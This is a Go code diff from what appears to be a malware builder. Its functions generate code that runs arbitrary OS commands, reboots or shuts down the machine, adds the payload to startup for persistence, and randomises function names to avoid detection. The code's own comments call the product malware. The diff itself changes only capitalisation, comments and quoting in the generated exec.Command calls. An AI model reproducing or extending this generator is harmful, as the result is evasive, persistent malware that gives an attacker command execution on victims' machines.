@@ -9,12 +9,14 @@ import (
 )
 
 //
+//
 // Exits the malware
+//
 //
 func Exit(s_json string, return_code string) (string, string) {
 	data_object := structure.Receive(s_json)
 
-	function_call := "exit"
+	function_call := "Exit"
 	var1 := "value"
 
 	if data_object.Obfuscate {
@@ -42,7 +44,7 @@ func Exit(s_json string, return_code string) (string, string) {
 //
 func Out(s_json string, msg string) (string, string) {
 	data_object := structure.Receive(s_json)
-	function_call := "out"
+	function_call := "Out"
 	var1 := "msg"
 
 	if data_object.Obfuscate {
@@ -63,11 +65,13 @@ func Out(s_json string, msg string) (string, string) {
 }
 
 //
+//
 // Executes a command on the running OS and prints the result
+//
 //
 func Exec(s_json string, cmd string) (string, string) {
 	data_object := structure.Receive(s_json)
-	function_call := "exec"
+	function_call := "Exec"
 
 	if data_object.Obfuscate {
 		function_call = tools.Generate_random_string()
@@ -100,7 +104,7 @@ func Exec(s_json string, cmd string) (string, string) {
 //
 func Abort(s_json string, languages string) (string, string) {
 	data_object := structure.Receive(s_json)
-	function_call := "abort"
+	function_call := "Abort"
 	var1 := "computer_lang"
 	var2 := "lang"
 	var3 := "languages"
@@ -144,7 +148,7 @@ func Abort(s_json string, languages string) (string, string) {
 //
 func Reboot(s_json string) (string, string) {
 	data_object := structure.Receive(s_json)
-	function_call := "reboot"
+	function_call := "Reboot"
 
 	if data_object.Obfuscate {
 		function_call = tools.Generate_random_string()
@@ -160,7 +164,7 @@ func Reboot(s_json string) (string, string) {
 	data_object.Add_go_function([]string{
 		fmt.Sprintf("func %s(){", function_call),
 
-		fmt.Sprintf("exec.Command(%s).Run()", cmd),
+		fmt.Sprintf("exec.Command(\"%s\").Run()", cmd),
 		"}"})
 
 	data_object.Add_go_import("os/exec")
@@ -176,7 +180,7 @@ func Reboot(s_json string) (string, string) {
 //
 func Shutdown(s_json string) (string, string) {
 	data_object := structure.Receive(s_json)
-	function_call := "shutdown"
+	function_call := "Shutdown"
 
 	if data_object.Obfuscate {
 		function_call = tools.Generate_random_string()
@@ -192,7 +196,7 @@ func Shutdown(s_json string) (string, string) {
 	data_object.Add_go_function([]string{
 		fmt.Sprintf("func %s(){", function_call),
 
-		fmt.Sprintf("exec.Command(%s).Run()", cmd),
+		fmt.Sprintf("exec.Command(\"%s\").Run()", cmd),
 		"}"})
 
 	data_object.Add_go_import("os/exec")
@@ -207,7 +211,7 @@ func Shutdown(s_json string) (string, string) {
 //
 func Add_to_startup(s_json string) (string, string) {
 	data_object := structure.Receive(s_json)
-	function_call := "add_2_startup"
+	function_call := "Add_2_startup"
 	var1 := "malware_path"
 
 	if data_object.Obfuscate {
